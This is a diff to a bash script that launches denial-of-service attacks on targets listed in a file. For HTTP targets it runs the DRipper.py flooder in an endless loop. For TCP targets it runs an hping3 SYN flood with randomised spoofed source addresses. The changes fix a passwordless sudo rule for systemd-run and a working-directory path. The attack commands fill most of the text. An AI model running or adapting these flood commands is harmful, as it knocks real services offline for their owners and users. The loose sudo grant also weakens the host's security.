@@ -32,8 +32,8 @@ if [[ $(groups | grep -c docker) == 0 ]]; then
 fi
 
 # Configure sudo
-if [[ ! -f /etc/sudoers.d/user || $(grep -c 'user ALL = NOPASSWD: /usr/bin/systemd-run' /etc/sudoers.d/user) == 0 ]]; then
-  echo "user ALL = NOPASSWD: /usr/bin/systemd-run" | sudo tee /etc/sudoers.d/user
+if [[ ! -f /etc/sudoers.d/${USER} || $(grep -c '${USER} ALL = NOPASSWD: /usr/bin/systemd-run' /etc/sudoers.d/${USER}) == 0 ]]; then
+  echo "${USER} ALL = NOPASSWD: /usr/bin/systemd-run" | sudo tee /etc/sudoers.d/${USER}
 fi
 
 # Create workdir and download sources
@@ -96,7 +96,7 @@ for target in $(cat ${target_file} | grep -v ^# | grep -xv '' | xargs); do
   # Create command for different protocols
   case ${proto} in
     http)
-      command="while true; do sudo systemd-run --scope -p MemoryLimit=${dripper_max_memory_per_process} env/bin/python -u DRipper.py -q -s ${ip} -p ${port} -t 135; done; echo 'Process exited. Press enter for close window...'; read"
+      command="while true; do cd ${work_dir} && sudo systemd-run --scope -p MemoryLimit=${dripper_max_memory_per_process} env/bin/python -u DRipper.py -q -s ${ip} -p ${port} -t 135; done; echo 'Process exited. Press enter for close window...'; read"
       ;;
     tcp)
       command="docker run --rm -it sflow/hping3 -d 120 -w 64 -D -S --flood --rand-source -V -u -p ${port} ${ip}; echo 'Process exited. Press enter for close window...'; read"
@@ -125,3 +125,4 @@ for target in $(cat ${target_file} | grep -v ^# | grep -xv '' | xargs); do
 done
 
 tmux attach -t ${tmux_session_name}
+                                                                                                                                                                                                                                      
